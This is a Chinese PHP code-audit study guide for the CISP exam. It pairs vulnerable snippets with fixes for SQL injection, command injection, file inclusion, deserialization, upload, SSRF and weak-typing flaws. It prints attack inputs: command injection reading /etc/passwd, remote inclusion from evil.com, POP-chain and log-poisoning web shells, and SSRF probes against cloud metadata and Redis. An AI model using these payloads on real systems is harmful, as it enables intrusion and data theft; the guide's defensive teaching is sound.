# PHP 代码审计实战指南

> **📘 文档定位**：CISP 考试代码审计核心内容 | 难度：⭐⭐⭐⭐ | 预计阅读：25 分钟
> PHP 代码审计是白盒测试的基础技能。本文从审计方法论、SQL 注入、命令注入、文件包含、反序列化到弱类型漏洞，系统梳理 PHP 常见漏洞与审计方法。

---

## 导航目录
- [一、审计方法论](#一审计方法论)
- [二、SQL注入](#二sql注入)
- [三、命令注入](#三命令注入)
- [四、文件包含](#四文件包含)
- [五、反序列化](#五反序列化)
- [六、文件上传](#六文件上传)
- [七、变量覆盖](#七变量覆盖)
- [八、SSRF](#八ssrf)
- [九、弱类型漏洞](#九弱类型漏洞)
- [十、完整审计案例](#十完整审计案例)
- [十一、自动化工具](#十一自动化工具)
- [十二、高分考点与知识巧记](#十二高分考点与知识巧记)

---

## 一、审计方法论

```
代码审计流程：

  ① 环境搭建 → 源码部署 + 调试器(Xdebug)
  ② 路由分析 → 梳理URL → 文件映射
  ③ 危险函数搜索 → grep 搜索敏感函数
  ④ 数据流追踪 → 从输入($_GET/$_POST)到输出(echo/exec)
  ⑤ 逐文件审计 → 重点：上传/登录/支付/后台功能

危险函数清单：
  命令执行: system, exec, shell_exec, passthru, proc_open, popen, ``(反引号)
  代码执行: eval, assert, preg_replace /e, create_function, call_user_func
  文件操作: include, require, file_get_contents, file_put_contents, move_uploaded_file
  数据库:   mysql_query, mysqli_query (无预处理的SQL拼接)
  SSRF:     curl_exec, file_get_contents(URL), fsockopen
```

---

## 二、SQL注入

### 2.1 无预处理的查询

```php
// ❌ 漏洞代码1: 直接拼接
$id = $_GET['id'];
$sql = "SELECT * FROM users WHERE id = $id";
$result = mysqli_query($conn, $sql);

// ❌ 漏洞代码2: 拼接 + 引号
$name = $_GET['name'];
$sql = "SELECT * FROM users WHERE name = '$name'";
$result = mysqli_query($conn, $sql);

// ❌ 漏洞代码3: LIKE 语句
$keyword = $_GET['keyword'];
$sql = "SELECT * FROM products WHERE name LIKE '%$keyword%'";
// 注入: keyword=' UNION SELECT 1,2,3 -- 
```

```php
// ✅ 修复: PDO 预处理
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = :id");
$stmt->execute(['id' => $_GET['id']]);

// ✅ 修复: mysqli 预处理
$stmt = $mysqli->prepare("SELECT * FROM users WHERE id = ?");
$stmt->bind_param("i", $_GET['id']);
$stmt->execute();
```

### 2.2 动态 ORDER BY / 表名

```php
// ❌ ORDER BY 无法使用预处理 → 需要白名单！
$order = $_GET['order'];  // 用户可控
$sql = "SELECT * FROM products ORDER BY $order";

// ✅ 修复: 白名单
$allowed = ['id', 'name', 'price', 'created_at'];
if (!in_array($_GET['order'], $allowed)) {
    die('Invalid column');
}
$sql = "SELECT * FROM products ORDER BY " . $_GET['order'];
```

---

## 三、命令注入

```php
// ❌ 漏洞代码1: exec 拼接
$host = $_POST['host'];
exec("ping -c 4 $host", $output);
// 攻击: host=127.0.0.1; cat /etc/passwd

// ❌ 漏洞代码2: shell_exec
$cmd = $_GET['cmd'];
echo shell_exec($cmd);

// ❌ 漏洞代码3: mail 函数注入(PHP<7.2)
$to = $_POST['email'];
mail($to, "Subject", "Body");
// 攻击: email=attacker@evil.com -OQueueDirectory=/tmp -X/var/www/html/shell.php

// ❌ 漏洞代码4: proc_open
$cmd = $_GET['cmd'];
$process = proc_open($cmd, $descriptorspec, $pipes);
```

```php
// ✅ 修复: escapeshellarg
exec("ping -c 4 " . escapeshellarg($_POST['host']));

// ✅ 修复: 白名单
$allowed = ['google.com', 'baidu.com', '8.8.8.8'];
if (!in_array($_POST['host'], $allowed)) die('Invalid host');
```

---

## 四、文件包含

```php
// ❌ LFI (本地文件包含)
$page = $_GET['page'];
include($page . '.php');
// 访问: ?page=../../../../etc/passwd%00 (PHP<5.3.4)
// 读取: /etc/passwd

// ❌ RFI (远程文件包含) — PHP<=5.2默认开启
$page = $_GET['page'];
include($page);
// 访问: ?page=http://evil.com/shell.txt (phpinfo()/system等)
// → 远程代码执行

// ❌ 文件读取
$file = $_GET['file'];
readfile($file);
// 访问: ?file=/etc/passwd

// ❌ phar:// 反序列化
include('phar://' . $_GET['file'] . '/test.txt');
// 触发 phar 文件中的反序列化 → POP链 RCE
```

```php
// ✅ 修复1: 白名单（推荐）
$allowed = ['home', 'about', 'contact'];
$page = $_GET['page'];
if (!in_array($page, $allowed)) die('Invalid page');
include($page . '.php');

// ✅ 修复2: 路径限制
$page = $_GET['page'];
$file = '/var/www/templates/' . basename($page) . '.php';
if (file_exists($file) && realpath($file) === $file) {
    include($file);
}

// ✅ 修复3: 禁止远程包含
// php.ini: allow_url_include = Off
// php.ini: allow_url_fopen 根据需要开关
```

---

## 五、反序列化

### 5.1 PHAR 反序列化

```php
// phar:// 协议触发 -- 无需 unserialize()!
// 只要代码中有任何文件操作函数处理用户输入的文件路径，
// 且该路径使用了 phar:// 伪协议 → 触发反序列化

// ❌ 漏洞:
$filename = $_GET['file'];
file_exists($filename);         // 触发!
is_dir($filename);              // 触发!
file_get_contents($filename);   // 触发!
include($filename);             // 触发!
// 几乎所有文件系统函数都会触发 phar:// 反序列化!

// 攻击:
// ① 构造恶意 phar 文件(含POP链)
// ② 上传 phar 文件到服务器(如头像上传)
// ③ 访问: ?file=phar://uploads/avatar.jpg → 触发反序列化
```

### 5.2 unserialize 直接调用

```php
// ❌ 直接反序列化用户输入
$data = unserialize($_COOKIE['data']);
echo $data->name;  // 触发 __toString → POP链

// 攻击链:
// ① 寻找有 __destruct/__wakeup/__toString 的类
// ② 串联成 POP Chain
// ③ 构造序列化Payload
// ④ 通过Cookie/POST/GET发送
```

### 5.3 POP Chain 审计

```php
// 审计：寻找可用的魔术方法

// 起点类（入口）: __destruct / __wakeup
class Start {
    public function __destruct() {
        $this->cleanup();  // → 跟踪此调用
    }
    public function cleanup() {
        file_put_contents($this->path, $this->data);
    }
}

// 中间类（跳板）: __toString / __call / __get
class Middle {
    public function __toString() {
        return $this->obj->action();  // → 跟踪此调用
    }
}

// 终点类（利用）: 可进行危险操作的方法
class End {
    public function action() {
        system($this->cmd);  // → 命令执行!
    }
}

// 完整POP链:
$payload = new Start();
$payload->path = '/var/www/html/shell.php';
$payload->data = '<?php system($_GET["cmd"]); ?>';
// serialize($payload) → 发送
```

---

## 六、文件上传

```php
// ❌ 漏洞1: 无任何校验
move_uploaded_file($_FILES['file']['tmp_name'], '/uploads/' . $_FILES['file']['name']);

// ❌ 漏洞2: 仅前端JS校验
// (可直接Burp抓包绕过)

// ❌ 漏洞3: 黑名单不完整
$blacklist = ['php', 'asp'];
$ext = pathinfo($filename, PATHINFO_EXTENSION);
if (!in_array($ext, $blacklist)) {
    move_uploaded_file(...);
}
// 可绕过: php5, phtml, pHp, php.（空格）, php::$DATA

// ❌ 漏洞4: Content-Type 可伪
if ($_FILES['file']['type'] == 'image/jpeg') {
    move_uploaded_file(...);
}
// Burp修改 Content-Type: image/jpeg → 绕过

// ✅ 修复:
$allowed = ['jpg', 'jpeg', 'png', 'gif'];
$ext = strtolower(pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION));
if (!in_array($ext, $allowed)) die('Invalid file type');

// 生成随机文件名
$newname = md5(uniqid()) . '.' . $ext;
move_uploaded_file($_FILES['file']['tmp_name'], '/uploads/' . $newname);

// 禁止执行脚本
// Nginx: location /uploads { location ~ \.php$ { deny all; } }
```

---

## 七、变量覆盖

```php
// ❌ extract() — 将数组键名变为变量
$user = ['name' => 'guest', 'role' => 'user'];
extract($user);
echo $role; // "user"

// 攻击: $_GET['role'] = 'admin'
extract(array_merge($user, $_GET));
// → $role = 'admin'

// ❌ parse_str()
parse_str($_SERVER['QUERY_STRING'], $output);
// 攻击: ?name=guest&role=admin → $role被覆盖

// ❌ $$变量变量
$var = $_GET['var'];  // var → 'admin'
$$var = 'hacker';     // $admin = 'hacker'

// ✅ 修复:
// 避免使用 extract/parse_str/$$ 处理用户输入
// 或使用 EXTR_SKIP 标志:
extract($_GET, EXTR_SKIP);  // 不覆盖已存在的变量
```

---

## 八、SSRF

```php
// ❌ curl_exec
$url = $_GET['url'];
$ch = curl_init($url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$response = curl_exec($ch);

// 攻击: ?url=http://169.254.169.254/latest/meta-data/ (AWS)
// 攻击: ?url=http://10.0.1.1/admin
// 攻击: ?url=file:///etc/passwd
// 攻击: ?url=gopher://127.0.0.1:6379/_INFO (Redis)

// ✅ 修复
function safe_curl($url) {
    // 白名单域名
    $allowed_hosts = ['api.trusted.com'];
    $host = parse_url($url, PHP_URL_HOST);
    if (!in_array($host, $allowed_hosts)) {
        die('Not allowed');
    }
    // 仅允许http/https
    $scheme = parse_url($url, PHP_URL_SCHEME);
    if (!in_array($scheme, ['http', 'https'])) {
        die('Invalid scheme');
    }
    // 禁止内网IP
    $ip = gethostbyname($host);
    if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE)) {
        // 是公网IP → 允许
    } else {
        die('Private IP not allowed');
    }
    return file_get_contents($url);  // 或 curl
}
```

---

## 九、弱类型漏洞

```php
// ① md5() 0e 开头碰撞
if (md5($_GET['a']) == md5($_GET['b'])) {
    echo 'admin';  // 弱比较 == 导致通过!
}
// a=240610708 → md5=0e462097...  b=QNKCDZO → md5=0e830400...
// 0e开头被PHP当作科学计数法 0×10^xxx = 0
// 0 == 0 → true → 绕过!

// ② strcmp() 数组绕过
if (strcmp($_GET['password'], 'secret') == 0) {
    echo 'logged in';
}
// 攻击: ?password[]= → strcmp返回NULL
// NULL == 0 → true → 绕过!

// ③ in_array() 松散比较
$whitelist = [1, 2, 3];
if (in_array($_GET['id'], $whitelist)) {
    echo "passed";  // id=1abc → 1abc==1 → true!
}
// ✅ in_array($val, $arr, true); // 严格比较

// ④ switch 松散比较
switch ($_GET['role']) {
    case 'admin': ...  // role=0 → 0=='admin' → true(意外!)
}
// ✅ switch(true) + if/elseif

// ⑤ is_numeric() 十六进制绕过
$id = $_GET['id'];
if (is_numeric($id)) {
    $sql = "SELECT * FROM users WHERE id=$id";
}
// id=0x61646D696E → is_numeric true + SQL注入!
```

---

## 十、完整审计案例

### ThinkCMF 5.x RCE 案例

```
漏洞：ThinkCMF 5.x 缓存文件包含导致 RCE

关键代码：
// ① 用户可控的模板变量
$template = $_GET['template'];  
// ② 模板文件名拼接
$file = './template/' . $template . '.html';
// ③ 文件存在即渲染（无路径限制）
if (file_exists($file)) {
    $content = file_get_contents($file);
    // ④ 渲染模板(可能执行PHP)
    $this->display($content);
}

利用链：
Step 1: 找到可上传文件的功能(如头像上传)
Step 2: 上传含PHP代码的图片马 → /upload/avatar/evil.jpg
Step 3: 访问: ?template=../../upload/avatar/evil
       → file_exists('./template/../../upload/avatar/evil.html')
       → 实际文件: ./upload/avatar/evil.html 不存在 → 失败

Step 4: 利用缓存机制
       先访问正常页面让其生成缓存文件
       缓存路径: data/cache/template/default_xxx.php
       访问: ?template=../../data/cache/template/default_xxx
       → 包含缓存文件(PHP代码可执行!)

或利用日志文件:
       发送请求: User-Agent: <?php system($_GET['cmd']); ?>
       日志路径: ../../data/log/2026/06.log
       → 包含日志文件 → PHP代码执行 → RCE!
```

---

## 十一、自动化工具

```bash
# Semgrep — 模式匹配静态分析
pip install semgrep
semgrep --config=auto /path/to/project

# 自定义规则 (semgrep-rules/php-sqli.yaml)
rules:
  - id: php-sqli-string-concat
    pattern-either:
      - pattern: mysqli_query($conn, "$SQL")
      - pattern: mysql_query("...$_GET[$X]...")
    message: Potential SQL injection
    severity: ERROR

# RIPS — PHP代码审计(商业，有社区版)
# Seay源代码审计系统 — 国产PHP审计工具
# SonarQube — 多语言静态分析

# PHP Security Checker
composer require --dev enlightn/security-checker
php vendor/bin/security-checker security:check
```

---

## ✅ 审计 Checklist

- [ ] 搜索危险函数: `grep -rn "exec\|system\|eval\|assert"`
- [ ] 追踪用户输入流: `$_GET → ... → SQL/执行`
- [ ] 检查 SQL 是否使用预处理
- [ ] 检查文件包含是否有白名单
- [ ] 检查文件上传的扩展名校验
- [ ] 检查 unserialize 数据来源
- [ ] 检查 SSRF 的URL过滤
- [ ] 检查弱类型比较(== vs ===)
- [ ] 检查 extract/parse_str/$$ 使用

---

## 十二、高分考点与知识巧记

> 🔑 **高分考点**：PHP 代码审计高频考点集中在危险函数识别、SQL 注入审计、文件包含漏洞、反序列化机制、弱类型陷阱。考试侧重"给定一段 PHP 代码，找出漏洞点并说明修复方式"。

| 考点 | 频次 | 核心记忆点 |
|:---|:---:|:---|
| 危险函数清单 | ⭐⭐⭐⭐⭐ | 命令执行(system/exec/shell_exec)、代码执行(eval/assert)、文件操作(include/require) |
| SQL 注入审计 | ⭐⭐⭐⭐⭐ | 非预处理拼接、动态 ORDER BY 无白名单、PDO/mysqli 预处理修复 |
| 文件包含 | ⭐⭐⭐⭐ | LFI(本地)/RFI(远程)、phar:// 反序列化、allow_url_include=Off |
| 反序列化 | ⭐⭐⭐⭐ | PHAR 反序列化无需 unserialize()、POP Chain 三要素(起点/中间/终点) |
| 弱类型漏洞 | ⭐⭐⭐⭐ | md5 0e 碰撞、strcmp 数组绕过、in_array 松散比较、is_numeric 十六进制 |

> 💡 **知识巧记**：PHP 危险函数分类记"命代文数 S"——命令执行(system/exec)、代码执行(eval/assert)、文件操作(include/file_get_contents)、数据库(mysql_query)、SSRF(curl_exec)。审计流程记"搭路搜追逐"——环境搭建、路由分析、搜索函数、追踪数据流、逐文件审计。弱类型五大坑：md5 0e 碰、strcmp 数组绕、in_array 松比较、switch 松散判、is_numeric 十六进制。

### 高分考点速查表

| 考察维度 | 关键结论 | 常见干扰项 |
|:---|:---|:---|
| 预处理 vs 拼接 | PDO/mysqli 预处理防 SQL 注入，ORDER BY 需白名单 | "预处理可以防所有 SQL 注入" ❌ |
| LFI vs RFI | LFI 读本地文件，RFI 远程代码执行(PHP≤5.2) | "LFI 不能 getshell" ❌ |
| PHAR 反序列化 | 无需 unserialize()，文件操作函数即可触发 | "只有 unserialize() 才触发反序列化" ❌ |
| extract() 风险 | 可将 GET/POST 参数覆盖已有变量 | "extract 只是方便的函数" ❌ |
| == vs === | 弱比较可绕过验证，始终用 === 严格比较 | "== 足够安全" ❌ |

### 知识巧记口诀

> **PHP 代码审计口诀**：
> 危险函数心中记，命代文数 S 五类齐。
> SQL 拼接是大忌，预处理绑定参数替。
> 文件包含白名单，phar 协议反序列化起。
> 上传后缀白名单控，随机文件名存储非 webroot。
> 弱类型五坑需警惕，=== 严格比较记心里。
